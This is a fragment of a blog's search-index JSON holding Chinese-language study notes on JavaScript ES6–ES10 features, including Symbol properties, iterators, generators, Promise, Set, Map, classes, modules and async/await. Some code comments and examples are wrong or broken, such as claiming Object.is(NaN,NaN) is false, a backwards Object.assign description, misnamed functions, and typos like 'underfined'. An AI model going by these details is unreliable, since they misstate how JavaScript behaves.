&quot;World&quot;]\n\nSymbol.replace方法会收到两个参数，第一个参数是replace方法正在作用的对象，上面例子是Hello，第二个参数是替换后的值，上面例子是World。\nSymbol.search对象的Symbol.search属性，指向一个方法，当该对象被String.prototype.search方法调用时，会返回该方法的返回值。\nString.prototype.search(regexp)// 等同于regexp[Symbol.search](this)class MySearch &#123;  constructor(value) &#123;    this.value = value;  &#125;  [Symbol.search](string) &#123;    return string.indexOf(this.value);  &#125;&#125;&#x27;foobar&#x27;.search(new MySearch(&#x27;foo&#x27;)) // 0\n\nSymbol.split对象的Symbol.split属性，指向一个方法，当该对象被String.prototype.split方法调用时，会返回该方法的返回值。\nString.prototype.split(separator, limit)// 等同于separator[Symbol.split](this, limit)\n\n下面是一个例子。\nclass MySplitter &#123;  constructor(value) &#123;    this.value = value;  &#125;  [Symbol.split](string) &#123;    let index = string.indexOf(this.value);    if (index === -1) &#123;      return string;    &#125;    return [      string.substr(0, index),      string.substr(index + this.value.length)    ];  &#125;&#125;&#x27;foobar&#x27;.split(new MySplitter(&#x27;foo&#x27;))// [&#x27;&#x27;, &#x27;bar&#x27;]&#x27;foobar&#x27;.split(new MySplitter(&#x27;bar&#x27;))// [&#x27;foo&#x27;, &#x27;&#x27;]&#x27;foobar&#x27;.split(new MySplitter(&#x27;baz&#x27;))// &#x27;foobar&#x27;\n\n上面方法使用Symbol.split方法，重新定义了字符串对象的split方法的行为，\nSymbol.iterator对象的Symbol.iterator属性，指向该对象的默认遍历器方法。\nconst myIterable = &#123;&#125;;myIterable[Symbol.iterator] = function* () &#123;  yield 1;  yield 2;  yield 3;&#125;;[...myIterable] // [1, 2, 3]\n\n对象进行for...of循环时，会调用Symbol.iterator方法，返回该对象的默认遍历器，详细介绍参见《Iterator 和 for…of 循环》一章。\nclass Collection &#123;  *[Symbol.iterator]() &#123;    let i = 0;    while(this[i] !== undefined) &#123;      yield this[i];      ++i;    &#125;  &#125;&#125;let myCollection = new Collection();myCollection[0] = 1;myCollection[1] = 2;for(let value of myCollection) &#123;  console.log(value);&#125;// 1// 2\n\nSymbol.toPrimitive对象的Symbol.toPrimitive属性，指向一个方法。该对象被转为原始类型的值时，会调用这个方法，返回该对象对应的原始类型值。\nSymbol.toPrimitive被调用时，会接受一个字符串参数，表示当前运算的模式，一共有三种模式。\n\nNumber：该场合需要转成数值\nString：该场合需要转成字符串\nDefault：该场合可以转成数值，也可以转成字符串\n\nlet obj = &#123;  [Symbol.toPrimitive](hint) &#123;    switch (hint) &#123;      case &#x27;number&#x27;:        return 123;      case &#x27;string&#x27;:        return &#x27;str&#x27;;      case &#x27;default&#x27;:        return &#x27;default&#x27;;      default:        throw new Error();     &#125;   &#125;&#125;;2 * obj // 2463 + obj // &#x27;3default&#x27;obj == &#x27;default&#x27; // trueString(obj) // &#x27;str&#x27;\n\nSymbol.toStringTag对象的Symbol.toStringTag属性，指向一个方法。在该对象上面调用Object.prototype.toString方法时，如果这个属性存在，它的返回值会出现在toString方法返回的字符串之中，表示对象的类型。也就是说，这个属性可以用来定制[object Object]或[object Array]中object后面的那个字符串。\n// 例一(&#123;[Symbol.toStringTag]: &#x27;Foo&#x27;&#125;.toString())// &quot;[object Foo]&quot;// 例二class Collection &#123;  get [Symbol.toStringTag]() &#123;    return &#x27;xxx&#x27;;  &#125;&#125;let x = new Collection();Object.prototype.toString.call(x) // &quot;[object xxx]&quot;\n\nES6 新增内置对象的Symbol.toStringTag属性值如下。\n\nJSON[Symbol.toStringTag]：’JSON’\nMath[Symbol.toStringTag]：’Math’\nModule 对象M[Symbol.toStringTag]：’Module’\nArrayBuffer.prototype[Symbol.toStringTag]：’ArrayBuffer’\nDataView.prototype[Symbol.toStringTag]：’DataView’\nMap.prototype[Symbol.toStringTag]：’Map’\nPromise.prototype[Symbol.toStringTag]：’Promise’\nSet.prototype[Symbol.toStringTag]：’Set’\n%TypedArray%.prototype[Symbol.toStringTag]：’Uint8Array’等\nWeakMap.prototype[Symbol.toStringTag]：’WeakMap’\nWeakSet.prototype[Symbol.toStringTag]：’WeakSet’\n%MapIteratorPrototype%[Symbol.toStringTag]：’Map Iterator’\n%SetIteratorPrototype%[Symbol.toStringTag]：’Set Iterator’\n%StringIteratorPrototype%[Symbol.toStringTag]：’String Iterator’\nSymbol.prototype[Symbol.toStringTag]：’Symbol’\nGenerator.prototype[Symbol.toStringTag]：’Generator’\nGeneratorFunction.prototype[Symbol.toStringTag]：’GeneratorFunction’\n\nSymbol.unscopables对象的Symbol.unscopables属性，指向一个对象。该对象指定了使用with关键字时，哪些属性会被with环境排除。\nArray.prototype[Symbol.unscopables]// &#123;//   copyWithin: true,//   entries: true,//   fill: true,//   find: true,//   findIndex: true,//   includes: true,//   keys: true// &#125;Object.keys(Array.prototype[Symbol.unscopables])// [&#x27;copyWithin&#x27;, &#x27;entries&#x27;, &#x27;fill&#x27;, &#x27;find&#x27;, &#x27;findIndex&#x27;, &#x27;includes&#x27;, &#x27;keys&#x27;]\n\n上面代码说明，数组有 7 个属性，会被with命令排除。\n// 没有 unscopables 时class MyClass &#123;  foo() &#123; return 1; &#125;&#125;var foo = function () &#123; return 2; &#125;;with (MyClass.prototype) &#123;  foo(); // 1&#125;// 有 unscopables 时class MyClass &#123;  foo() &#123; return 1; &#125;  get [Symbol.unscopables]() &#123;    return &#123; foo: true &#125;;  &#125;&#125;var foo = function () &#123; return 2; &#125;;with (MyClass.prototype) &#123;  foo(); // 2&#125;\n\n上面代码通过指定Symbol.unscopables属性，使得with语法块不会在当前作用域寻找foo属性，即foo将指向外层作用域的变量。\n迭代器\n迭代器(lterator)是一种接口，为各种不同的数据结构提供统一的访问机制。任何数据结构只要部署lterator接口，就可以完成遍历操作。\n\n原理\n创建一个指针对象，指向当前数据结构的起始位置；\n第一次调用对象的 next 方法，指针自动指向数据结构的第一个成员； \n接下来不断调用 next 方法，指针一直往后移动，直到指向最后一个成员；\n每调用 next 方法返回一个包含 value 和 done 属性的对象；\n\n\n 注：需要自定义遍历数据的时候，要想到迭代器\n\nconst xiyou=[&#x27;AA&#x27;,&#x27;BB&#x27;,&#x27;CC&#x27;,&#x27;DD&#x27;];// for(let v of xiyou)&#123;//     console.log(v)  // &#x27;AA&#x27;,&#x27;BB&#x27;,&#x27;CC&#x27;,&#x27;DD&#x27;  //for in保存的是键名，for of保存的是键值// &#125;let iterator = xiyou[Symbol.iterator]();console.log(iterator.next()); //&#123;&#123;value:&#x27;唐僧&#x27;，done:false&#125;&#125;console.log(iterator.next()); //&#123;&#123;value:&#x27;孙悟空&#x27;，done:false&#125;&#125;\n\n特性ES6 创造了一种新的遍历命令 for…of 循环，Iterator 接口主要供 for…of 消费； \n原生具备 iterator 接口的数据(可用 for of 遍历)： \nArray； Arguments； Set； Map； String； TypedArray； NodeList。Object对象没有\n应用（自定义遍历数据）const banji = &#123;    name : &quot;终极一班&quot;,    stus: [        &#x27;aa&#x27;,        &#x27;bb&#x27;,        &#x27;cc&#x27;,        &#x27;dd&#x27;    ],    [Symbol.iterator]()&#123;        let index = 0;        let _this = this;        return &#123;            next: () =&gt; &#123;                if(index &lt; this.stus.length)&#123;                    const result = &#123;value: _this.stus[index],done: false&#125;;                    //下标自增                    index++;                    //返回结果                    return result;                &#125;else &#123;                    return &#123;value: underfined,done:true&#125;;                &#125;            &#125;        &#125;    &#125;&#125;for(let v of banji)&#123;    console.log(v);  // aa bb cc dd&#125;\n\n生成器（generator）\n生成器函数是ES6提供的一种异步编程解决方案，语法行为与传统函数完全不同，是一种特殊的函数\njs传统异步编程：纯回调函数 fs ajax mangodb（文件操作、网络操作、数据库操作）\n\nfunction * gen ()&#123;    //函数名和function中间有一个 *     yield &#x27;耳朵&#x27;；     //yield是函数代码的分隔符    yield &#x27;尾巴&#x27;；    yield &#x27;真奇怪&#x27;；&#125;let iterator = gen();console.log(iteretor.next()); //&#123;value:&#x27;耳朵&#x27;,done:false&#125; next（）执行第一段，并且返回yield后面的值console.log(iteretor.next()); //&#123;value:&#x27;尾巴&#x27;,done:false&#125;console.log(iteretor.next()); //&#123;value:&#x27;真奇怪&#x27;,done:false&#125;\n\n应用\n生成器函数的参数传递\nfunction * gen(args)&#123;    console.log(args);    let one = yield 111;    console.log(one);    let two = yield 222;    console.log(two);    let three = yield 333;    console.log(three);&#125;let iterator = gen(&#x27;AAA&#x27;);console.log(iterator.next());console.log(iterator.next(&#x27;BBB&#x27;));  //next中传入的BBB将作为yield 111的返回结果console.log(iterator.next(&#x27;CCC&#x27;));  //next中传入的CCC将作为yield 222的返回结果console.log(iterator.next(&#x27;DDD&#x27;));  //next中传入的DDD将作为yield 333的返回结果\n\n\n\n第二次next()的实参将作为第一次yield的返回结果\n第三次next()的实参将作为第二次yield的返回结果\n第四次next()的实参将作为第三次yield的返回结果\n\n\n实例1：用生成器函数的方式解决回调地狱问题\n传统方法：（回调地狱：层层嵌套缩进、参数容易重名、阅读不便、调试不便）\nsetTimeout(()=&gt;&#123;     console.log(&#x27;111&#x27;)     setTimeout(()=&gt;&#123;         console.log(&#x27;222&#x27;)         setTimeout(()=&gt;&#123;             console.log(&#x27;333&#x27;)                     &#125;,3000)    &#125;,2000)&#125;,1000)\n\n生成器函数方法：\n//1s后后输出111 2s后输出222 3s后输出333function one()&#123;           //第一个异步任务    setTimeout(()=&gt;&#123;        console.log(&#x27;111&#x27;)        iterator.next()    &#125;,1000)&#125;function two()&#123;           //第二个异步任务    setTimeout(()=&gt;&#123;        console.log(&#x27;222&#x27;)        iterator.next();    &#125;,2000)&#125;function three()&#123;          //第三个异步任务    setTimeout(()=&gt;&#123;        console.log(&#x27;333&#x27;)        iterator.next();    &#125;,3000)&#125;function * gen()&#123;         //生成器函数    yield one();    yield two();    yield three();&#125;let iterator = gen();iterator.next();\n\n实例2：模拟异步获取数据（先获取用户数据、再订单数据、最后商品数据）\nfunction getUsers()&#123;    setTimeout(()=&gt;&#123;        let data=&#x27;用户数据&#x27;;        iterator.next(data)   //第二次next()的实参将作为第一次yield的返回结果    &#125;,1000)&#125;function getOrders()&#123;    setTimeout(()=&gt;&#123;        let data=&#x27;订单数据&#x27;;        iterator.next(data)  //第三次next()的实参将作为第二次yield的返回结果    &#125;,1000)&#125;function getGoods()&#123;    setTimeout(()=&gt;&#123;        let data=&#x27;商品数据&#x27;;           iterator.next(data)   //第四次next()的实参将作为第三次yield的返回结果    &#125;,1000)&#125;function * gen()&#123;    let users=yield one();    console.log(users)    let orders=yield two();    console.log(orders)    let goods=yield three();    console.log(goods)&#125;let iterator = gen();iterator.next();\n\nPromise\nPromise是ES6引入的异步编程的新解决方案。语法上 Promise是一个构造函数，用来封装异步操作并可以获取其成功或失败的结果。\n\nconst p =new Promise((resolve, reject)=&gt;&#123;    setTimeout(()=&gt;&#123;        let data=&#x27;数据库数据&#x27;        // resolve(data);        reject(data);    &#125;)&#125;)p.then(function (value)&#123;         //成功则执行第一个回调函数，失败则执行第二个    console.log(value)&#125;,function (reason)&#123;    console.error(reason)&#125;)\n\nSet\nES6提供了新的数据结构set(集合）。它类似于数组，但成员的值都是唯一的，集合实现了iterator接口，所以可以使用「扩展运算符』和「 for…of…』进行遍历，集合的属性和方法:\n\n\nsize返回集合的元素个数\nadd增加一个新元素，返回当前集合\ndelete删除元素，返回boolean值has检测集合中是否包含某个元素，返回boolean值\n\n&lt;script&gt;    let s = new Set();    let s2 = new Set([&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;A&#x27;])    //元素个数    console.log(s2.size);    //4    //添加新的元素    s2.add(&#x27;E&#x27;);    //删除元素    s2.delete(&#x27;A&#x27;)    //检测    console.log(s2.has(&#x27;C&#x27;));  //true    //清空    s2.clear()    console.log(s2);        for (let v of s2)&#123;        console.log(v);    &#125;&lt;/script&gt;\n\n应用&lt;script&gt;    let arr = [1,2,3,4,5,4,3,2,1]    //1.数组去重    let result = [...new Set(arr)]    //使用扩展运算符将集合变成数组    console.log(result);    //2.交集    let arr2=[4,5,6,5,6]    let result2 = [...new Set(arr)].filter(item =&gt; new Set(arr2).has(item))    console.log(result2);    //3.并集    let result3=[new Set([...arr,...arr2])]    console.log(result3);    //4.差集    let result4= [...new Set(arr)].filter(item =&gt; !(new Set(arr2).has(item)))    console.log(result4);&lt;/script&gt;\n\nMap\nES6提供了Map数据结构。它类似于对象，也是键值对的集合。但是“键”的范围不限于字符串，各种类型的值（包括对象）都可以当作键。Map也实现了iterator接口，所以可以使用『扩展运算符』和「for…of…』进行遍历。Map的属性和方法。\n\n&lt;script&gt;    let m = new Map();    m.set(&#x27;name&#x27;,&#x27;ran&#x27;);    m.set(&#x27;change&#x27;,()=&gt;&#123;        console.log(&#x27;改变！&#x27;)    &#125;)    let key=&#123;        school:&#x27;atguigu&#x27;    &#125;    m.set(key,[&#x27;成都&#x27;,&#x27;西安&#x27;]);    //size    console.log(m.size);    //删除    m.delete(&#x27;name&#x27;);    //获取    console.log(m.get(&#x27;change&#x27;));    // //清空    // m.clear()    //遍历    for(let v of m)&#123;        console.log(v);    &#125;&lt;/script&gt;\n\nClass\nES6提供了更接近传统语言(java,c++)的写法，引入了Class（类）这个概念，作为对象的模板。通过class关键字，可以定义类。基本上，ES6的class可以看作只是一个语法糖，它的绝大部分功能，ES5都可以做到，新的class写法只是让对象原型的写法更加清晰、更像面向对象编程的语法而已。\n\nES5使用构造函数实例化方法：\n//手机function Phone(brand, price)&#123;    this.brand = brand;    this.price = price;&#125;//添加方法Phone.prototype.call = function()&#123;    console.log(&quot;我可以打电话!!&quot;);&#125;//实例化对象let Huawei = new Phone(&#x27;华为&#x27;, 5999);Huawei.call();console.log(Huawei);\n\nES6使用class实例化方法：\n&lt;script&gt;    class shouji &#123;        constructor(brand,price) &#123;            this.brand=brand;            this.price=price        &#125;        call()&#123;            console.log(&#x27;我可以打电话&#x27;)        &#125;    &#125;    let A = new shouji(&#x27;1+&#x27;,1999);    console.log(A)&lt;/script&gt;\n\n静态成员\n属于类而不属于示例对象的属性\n\n//传统写法function Phone()&#123;&#125;Phone.name = &#x27;手机&#x27;;Phone.change = function()&#123;    console.log(&quot;我可以改变世界&quot;);&#125;Phone.prototype.size = &#x27;5.5inch&#x27;;let nokia = new Phone();  console.log(nokia.name);    //undefined// nokia.change();console.log(nokia.size);    //&#x27;5.5inch&#x27;//class写法class Person&#123;\tstatic name=&#x27;手机&#x27;&#125;let nokia = new Person();console.log(nokia.name);    //undefined\n\n继承\nES5中使用构造函数实现继承（原型链）\n&lt;script&gt;  //父函数  function Phone(brand,price)&#123;      this.brand=brand;      this.price=price;  &#125;  Phone.prototype.call=function ()&#123;      console.log(&quot;我可以打电话&quot;);  &#125;  //子函数  function SmartPhone(brand,price,color,size)&#123;      Phone.call(this,brand,price);      this.color=color;      this.size=size;  &#125;  //设置子级构造函数原型  SmartPhone.prototype=new Phone;  SmartPhone.prototype.constructor=SmartPhone;  //声明子类方法  SmartPhone.prototype.photo = function ()&#123;      console.log(&#x27;我可以拍照&#x27;);  &#125;  const chuizi = new SmartPhone(&#x27;锤子&#x27;,2499,&#x27;黑色&#x27;,&#x27;5.5inch&#x27;)  console.log(chuizi);&lt;/script&gt;\n\nES6中Class的类继承\n&lt;script&gt;    class Phone&#123;        constructor(brand,price) &#123;            this.brand=brand;            this.price=price;        &#125;        //父类的成员属性        call()&#123;            console.log(&#x27;我可以打电话&#x27;)        &#125;    &#125;    class SmartPhone extends Phone&#123;        constructor(brand,price,color,size) &#123;            super(brand,price);      //super即为父类的constructor方法            this.color=color;            this.size=size;        &#125;        photo()&#123;            console.log(&#x27;拍照&#x27;);        &#125;        playGame()&#123;            console.log(&#x27;打游戏&#x27;);        &#125;    &#125;    const xiaomi=new SmartPhone(&#x27;小米&#x27;,1999,&#x27;黑色&#x27;,&#x27;4.7inch&#x27;)    xiaomi.call();    xiaomi.photo();    xiaomi.playGame();&lt;/script&gt;\n\n子类对父类方法的重写&lt;script&gt;    class Phone&#123;        constructor(brand,price) &#123;            this.brand=brand;            this.price=price;        &#125;        //父类的成员属性        call()&#123;            console.log(&#x27;我可以打电话&#x27;)        &#125;    &#125;    class SmartPhone extends Phone&#123;        constructor(brand,price,color,size) &#123;            super(brand,price);            this.color=color;            this.size=size;        &#125;        photo()&#123;            console.log(&#x27;拍照&#x27;);        &#125;        playGame()&#123;            console.log(&#x27;打游戏&#x27;);        &#125;        //重写！        call()&#123;            console.log(&#x27;我可以进行视频通话&#x27;)        &#125;    &#125;    const xiaomi=new SmartPhone(&#x27;小米&#x27;,1999,&#x27;黑色&#x27;,&#x27;4.7inch&#x27;)    xiaomi.call();    xiaomi.photo();    xiaomi.playGame();&lt;/script&gt;\n\nget和set设置&lt;script&gt;  class Phone&#123;      get price()&#123;          console.log(&quot;价格被读取了&quot;)          return &#x27;I LOVE YOU&#x27;      &#125;      set price(val)&#123;          console.log(&#x27;价格被修改了&#x27;)          return val;      &#125;  &#125;    //实例化对象    let s = new Phone();     s.price=12                //输出 价格被修改了    // console.log(s.price)   //输出 价格被读取了 I LOVE YOU&lt;/script&gt;\n\n数值扩展&lt;script&gt;   // Number.EPSILON是 JavaScript的最小精度，属性的值接近于 2.22044...E-16   function equal(a,b)&#123;       if(Math.abs(a-b) &lt; Number.EPSILON)&#123;           return true;       &#125;else &#123;           return false;       &#125;   &#125;   console.log(equal(0.1 + 0.2 === 0.3))  //false   console.log(equal(0.1+0.2,0.3))  //true   //二进制和八进制   let b = 0b1010; //2进制0b   let o = 0o777;  //8进制0o   let d = 100;    //10进制   let x = 0xff;   //16进制0x   console.log(x)   //255   //检测一个数是否为有限数   console.log(Number.isFinite(100));  //true   console.log(Number.isFinite(100/0));  //false   console.log(Number.isFinite(Infinity));  //false   //检测一个数值是否为NaN   console.log(Number.isNaN(123))  //false   //字符串转整数   console.log(Number.parseInt(&#x27;5213123love&#x27;)); //5213123   console.log(Number.parseFloat(&#x27;5.123123神器&#x27;)); //5.123123   //判断是否为整数   console.log(Number.isInteger(5));  //true   console.log(Number.isInteger(2.5)); //false      //将小数部分抹除   console.log(Math.trunc(3.45345345345)) //3   //检测一个数到底是正数、负数、还是0   console.log(Math.sign(100)) //1   console.log(Math.sign(0))  //0   console.log(Math.sign(-123)) //-1&lt;/script&gt;\n\n对象方法扩展&lt;script&gt;    //1.Object.is 判断两个值是否完全相等    console.log(Object.is(120,120))  //true\tconsole.log(Object.is(NaN,NaN))  //false    //2.Object.assign 对象的合并    const a = &#123;        name:&#x27;ran&#x27;,        age:12    &#125;    const b = &#123;        pass:&#x27;i love you&#x27;    &#125;    console.log(Object.assign(a,b))   //&#123;name:&#x27;ran&#x27;,age:&#x27;12&#x27;,pass:&#x27;i love you&#x27;&#125;前者为模板，后者会被前者属性覆盖，前者独有的属性不会被覆盖    //3.Object.setPrototypeOf 设置原型对象 Object.getPrototypeof    const school = &#123;        name:&#x27;尚硅谷&#x27;    &#125;    const cities = &#123;        xiaoqu:[&#x27;北京&#x27;,&#x27;上海&#x27;]    &#125;    Object.setPrototypeOf(school,cities)    console.log(Object.getPrototypeOf(school))  //&#123;xiaoqu: Array(2)&#125;    console.log(school)  //&#123;name: &quot;尚硅谷&quot;&#125;&lt;/script&gt;\n\n模块化\n模块化是指将一个大的程序文件,拆分成许多小的文件，然后将小文件组合起来。\n\n\n模块化的好处：\n\n防止命名冲突\n\n代码复用\n\n高维护性\n\n模块化规范产品\n\n\n\nES6之前的模块化规范有：\n\nCommonJS &#x3D;&#x3D;&#x3D;&#x3D;&gt; NodeJS、Browserify\n\nAMD &#x3D;&#x3D;&#x3D;&#x3D;&gt; requireJS\n\nCMD &#x3D;&#x3D;&#x3D;&#x3D;&gt; seaJS\n\n\n\n\nES6模块化语法模块功能主要有两个命令构成：export和import\n\nexport命令用于规定模块的对外接口\nimport命令用于输入其他模块提供的功能、\n\nm1.js\nexport let school = &#x27;尚硅谷&#x27;export function teach()&#123;    console.log(&#x27;教技能&#x27;)&#125;\n\nindex.html\n&lt;script type=&quot;module&quot;&gt;    import * as m1 from &quot;./src/js/m1.js&quot;;\tconsole.log(m1);&lt;/script&gt;\n\n暴露语法汇总\n分别暴露\nexport let school = &#x27;尚硅谷&#x27;export function teach()&#123;    console.log(&#x27;教技能&#x27;)&#125;\n\n统一暴露\n//统一暴露let school = &#x27;尚硅谷&#x27;;function findjob()&#123;    console.log(&#x27;找工作吧&#x27;);&#125;export &#123;school,findjob&#125;;\n\n默认暴露\n//默认暴露export default &#123;    school:&#x27;ATGUIGU&#x27;,    change:function()&#123;        console.log(&#x27;我们可以改变你&#x27;)    &#125;&#125;\n\n引入语法汇总\n通用导入方式\nimport * as m1 from &quot;./src/js/m1.js&quot;import * as m2 from &quot;./src/js/m2.js&quot;import * as m3 from &quot;./src/js/m3.js&quot;\n\n解构赋值形式\nimport &#123;school,teach&#125; from &quot;./src/js/m1.js&quot;         //对应分别暴露import &#123;school as guigu,findJob&#125; from &quot;./src/js/m2.js&quot;  //对应统一暴露import &#123;default as m3 &#125; from &quot;./src/js/m3.js&quot;     //对应默认暴露\n\n简便形式（只针对默认暴露）\nimport m3 from &quot;./src/js/m3.js&quot;\n\n模块化方式2不在html写js语句\napp.js 入口文件（模块引入）\nimport * as m1 from &quot;./src/js/m1.js&quot;import * as m2 from &quot;./src/js/m2.js&quot;import * as m3 from &quot;./src/js/m3.js&quot;\n\nindex.html\n&lt;script src=&quot;./src//js/app.js&quot; type=modeule&gt;&lt;/script&gt;\n\nES6模块化代码在项目中的使用babel对ES6模块化代码转换\n\nbabel：一个js编译器，将较新的语法转化为ES5语法，以适配所有浏览器的兼容\n\n","categories":["ES6"],"tags":["ES6"]},{"title":"ES6（六）：ES10新特性","url":"/2022/04/30/ES6%EF%BC%88%E5%85%AD%EF%BC%89%EF%BC%9AES10%E6%96%B0%E7%89%B9%E6%80%A7/","content":"对象扩展方法\nObject.fromEntries 用来创建对象，接收参数为一个二维数组或map\n相当于Object.entries的逆运算\n&lt;script&gt;   //二维数组   const res = Object.fromEntries([       [&#x27;name&#x27;,&#x27;RHF&#x27;],       [&#x27;cities&#x27;,&#x27;成都&#x27;,&#x27;武汉&#x27;]   ])   console.log(res) //&#123;name: &quot;RHF&quot;, cities: &quot;成都&quot;&#125;   //Map   const m = new Map();   m.set(&#x27;name&#x27;,&#x27;ranhaifeng&#x27;)   const result = Object.fromEntries(m)   console.log(result); //&#123;name: &quot;ranhaifeng&quot;&#125;&lt;/script&gt;\n\n字符串扩展方法trimStart与trimEnd&lt;script&gt;   //trim   let str= &#x27; asd  &#x27;   console.log(str) //asd   console.log(str.trimStart()) //asd  清空左侧空格   console.log(str.trimEnd()) //  asd  清空右侧空格&lt;/script&gt;\n\n数组方法扩展flat与flatMap\nflat 将多维数组转换为低维数组\n\n&lt;script&gt;    const arr = [1,2,3,[4,5,6,[7,8,9]]]    //参数为深度，是一个数字    console.log(arr.flat(2)) //[1,2,3,4,5,6,7,8,9]\tconst arr2=[1,2,3,4]    const result = arr2.flatmap(item =&gt; [item * 10]); //如果map的结果是一个多维数组可以进行flat 是两个操作的结合\t&lt;/script&gt;\n\nSymbol扩展Symbol.prototype.description\n用来获取Symbol的字符串描述\n\nlet s = Symbol(&#x27;尚硅谷&#x27;);console.log(s.description) //尚硅谷\n\n","categories":["ES6"],"tags":["ES10"]},{"title":"ES6（三）：ES7新特性","url":"/2022/04/30/ES6%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9AES7%E6%96%B0%E7%89%B9%E6%80%A7/","content":"Array.prototype.includes\n用来检测数组中是否包含某个元素，返回布尔类型值\n\n&lt;script&gt;    //include  与 indexOf区别   const mingzhu = [&#x27;西游记&#x27;,&#x27;红楼梦&#x27;,&#x27;水浒传&#x27;,&#x27;三国演义&#x27;]   console.log(mingzhu.includes(&#x27;西游记&#x27;))  //true   console.log(mingzhu.includes(&#x27;金瓶梅&#x27;))  //false&lt;/script&gt;\n\n\n\n指数操作符\n在ES7中引入指数操作符**，用来实现幂运算，功能与Math.pow结果相同\n\n//**console.log(2**10) // 1024\n\n","categories":["ES6"],"tags":["ES7"]},{"title":"ES6（五）：ES9新特性","url":"/2022/04/30/ES6%EF%BC%88%E4%BA%94%EF%BC%89%EF%BC%9AES9%E6%96%B0%E7%89%B9%E6%80%A7/","content":"运算扩展符与rest参数\nRest 参数与 spread 扩展运算符在 ES6 中已经引入，不过 ES6 中只针对于数组，在 ES9 中为对象提供了像数组一样的 rest 参数和扩展运算符\n\nrest参数&lt;script&gt;    function connect(&#123;host,port,...user&#125;)&#123;        console.log(host);        console.log(port);        console.log(user)    &#125;    connect(&#123;        host:&#x27;127.0.0.1&#x27;,        port:3306,        username:&#x27;root&#x27;,        password:&#x27;root&#x27;,        type:&#x27;master&#x27;    &#125;)  //127.0.0.1  3306  &#123;username: &quot;root&quot;, password: &quot;root&quot;, type: &quot;master&quot;&#125;&lt;/script&gt;\n\n扩展运算符//对象合并const skillOne = &#123;    q: &#x27;天音波&#x27;&#125;const skillTwo = &#123;    w: &#x27;金钟罩&#x27;&#125;const skillThree = &#123;    e: &#x27;天雷破&#x27;&#125;const skillFour = &#123;    r: &#x27;猛龙摆尾&#x27;&#125;const mangseng = &#123;...skillOne, ...skillTwo, ...skillThree, ...skillFour&#125;;console.log(mangseng)// ...skillOne   =&gt;  q: &#x27;天音波&#x27;, w: &#x27;金钟罩&#x27;\n\n正则扩展命名捕获分组\n传统方法\n//声明一个字符串let str = &#x27;&lt;a href=&quot;http://www.atguigu.com&quot;&gt;尚硅谷&lt;/a&gt;&#x27;;//提取 url 与 『标签文本』const reg = /&lt;a href=&quot;(.*)&quot;&gt;(.*)&lt;\\/a&gt;/;//执行const result = reg.exec(str);console.log(result);console.log(result[0]);console.log(result[1]);\n\n\n\n命名捕获分组\nlet str = &#x27;&lt;a href=&quot;http://www.atguigu.com&quot;&gt;尚硅谷&lt;/a&gt;&#x27;;//分组命名const reg = /&lt;a href=&quot;(?&lt;url&gt;.*)&quot;&gt;(?&lt;text&gt;.*)&lt;\\/a&gt;/;const result = reg.exec(str);console.log(result.groups.url);console.log(result.groups.text);\n\n\n\n\n反向断言（判断）//声明字符串let str = &#x27;JS5211314你知道么555啦啦啦&#x27;;//正向断言const reg = /\\d+(?=啦)/;      //根据后边内容判断前面内容是否合法const result = reg.exec(str);//反向断言const reg = /(?&lt;=么)\\d+/;     //根据前边内容判断后面内容是否合法const result = reg.exec(str);console.log(result);\n\ndotAll模式//dot  .  元字符  除换行符以外的任意单个字符let str = `    &lt;ul&gt;        &lt;li&gt;            &lt;a&gt;肖生克的救赎&lt;/a&gt;            &lt;p&gt;上映日期: 1994-09-10&lt;/p&gt;        &lt;/li&gt;        &lt;li&gt;            &lt;a&gt;阿甘正传&lt;/a&gt;            &lt;p&gt;上映日期: 1994-07-06&lt;/p&gt;        &lt;/li&gt;    &lt;/ul&gt;`;//声明正则//const reg = /&lt;li&gt;\\s+&lt;a&gt;(.*?)&lt;\\/a&gt;\\s+&lt;p&gt;(.*?)&lt;\\/p&gt;/;const reg = /&lt;li&gt;.*?&lt;a&gt;(.*?)&lt;\\/a&gt;.*?&lt;p&gt;(.*?)&lt;\\/p&gt;/gs;//执行匹配// const result = reg.exec(str);let result;let data = [];while(result = reg.exec(str))&#123;data.push(&#123;title: result[1], time: result[2]&#125;);&#125;//输出结果console.log(data);\n\n","categories":["ES6"],"tags":["ES9"]},{"title":"ES6（四）：ES8新特性","url":"/2022/04/30/ES6%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9AES8%E6%96%B0%E7%89%B9%E6%80%A7/","content":"async和await\nasync和await两种语法结合可以让异步代码像同步代码一样，也是异步编程的一种新的解决方案。（1.生成器函数 2.promise 3.async和await）\n\nasync函数：\nasync函数的返回值为promise对象\nasync返回的promise对象的结果值由async函数执行的返回值决定\n\nasync function fn()&#123;   //1.如果返回的是一个非Promise的对象，则fn（）返回的结果就是成功状态的Promise对象，值为返回值   //2.如果返回的是一个Promise对象，则fn（）返回的结果与内部Promise对象的结果一致   //3.如果返回的是抛出错误，则fn（）返回的就是失败状态的Promise对象   return new Promise((resolve,reject)=&gt;&#123;       resolve(&#x27;成功的数据&#x27;);   &#125;);&#125;const result = fn();result.then(value=&gt;&#123;   console.log(value)  //成功的数据&#125;,reason=&gt;&#123;   console.log(reason)&#125;)\n\nawait表达式\nawait必须放在async函数中\nawait右侧的表达式一般为promise对象\nawait可以返回的是右侧promise成功的值\nawait右侧的promise如果失败了，就会抛出异常，需要通过try…catch捕获处理\n\n //创建Promise对象const p = new Promise((resolve, reject) =&gt; &#123;    // resolve(&quot;成功的值&quot;)    reject(&quot;失败了&quot;)&#125;)//await 必须放在async函数中async function main() &#123;    try &#123;        let res = await p;        console.log(res);    &#125; catch (e) &#123;        console.log(e);    &#125;&#125;//调用函数main()  //失败了\n\n应用\nasync和await结合读取文件\n//1. 引入 fs 模块const fs = require(&quot;fs&quot;);//读取『为学』function readWeiXue() &#123;    return new Promise((resolve, reject) =&gt; &#123;        fs.readFile(&quot;./resources/为学.md&quot;, (err, data) =&gt; &#123;            //如果失败            if (err) reject(err);            //如果成功            resolve(data);        &#125;)    &#125;)&#125;function readChaYangShi() &#123;    return new Promise((resolve, reject) =&gt; &#123;        fs.readFile(&quot;./resources/插秧诗.md&quot;, (err, data) =&gt; &#123;            //如果失败            if (err) reject(err);            //如果成功            resolve(data);        &#125;)    &#125;)&#125;function readGuanShu() &#123;    return new Promise((resolve, reject) =&gt; &#123;        fs.readFile(&quot;./resources/观书有感.md&quot;, (err, data) =&gt; &#123;            //如果失败            if (err) reject(err);            //如果成功            resolve(data);        &#125;)    &#125;)&#125;//声明一个 async 函数async function main()&#123;    //获取为学内容    let 